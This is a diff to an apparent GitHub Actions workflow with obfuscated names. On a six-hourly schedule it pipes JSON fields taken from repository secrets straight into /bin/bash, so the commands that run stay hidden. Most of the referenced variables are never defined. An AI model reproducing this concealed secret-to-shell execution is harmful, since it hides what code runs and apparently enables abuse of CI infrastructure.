@@ -1,8 +1,10 @@
 name: dengfei19871010
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 4/6 * * *'
+    - cron: '59 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,12 +12,22 @@ jobs:
       - uses: actions/checkout@v4
       - name: dengfei19871010
         env:
-          pbm76816: ${{ secrets.pbm76816 }}
+          adg3131: ${{ secrets.adg3131 }}
         run: |
-          echo $pbm76816 | jq -r .sopel639 | /bin/bash
-          echo $bysqw96328 | jq -r .qtb9508 | /bin/bash
-          echo $uuasn2 | jq -r .dvebp55 | /bin/bash
-          echo $gtun766 | jq -r .wbi25307 | /bin/bash
-          echo $khrd140 | jq -r .mtfoo029 | /bin/bash
-          echo $fph3 | jq -r .shwav5 | /bin/bash
+          echo $adg3131 | jq -r .uwt886 | /bin/bash
+          echo $i16644 | jq -r .uh185 | /bin/bash
+          echo $vsacv4728 | jq -r .nnnxr6 | /bin/bash
+          echo $n97704 | jq -r .eh04 | /bin/bash
+          echo $nayb237 | jq -r .aqzox70065 | /bin/bash
+          echo $uibh261 | jq -r .pg52252 | /bin/bash
+          echo $szv797 | jq -r .mdw007 | /bin/bash
+          echo $pmviw87 | jq -r .znzd2 | /bin/bash
+          echo $k77 | jq -r .wqoc068 | /bin/bash
+          echo $kldj747 | jq -r .gkd7 | /bin/bash
+          echo $iyq43 | jq -r .faw4843 | /bin/bash
+          echo $cdhc3116 | jq -r .xzvo0726 | /bin/bash
+          echo $fmn3 | jq -r .ms30 | /bin/bash
+          echo $j11 | jq -r .k098 | /bin/bash
+          echo $jmro8 | jq -r .caekc832 | /bin/bash
+          echo $iyk2945 | jq -r .m81 | /bin/bash
 
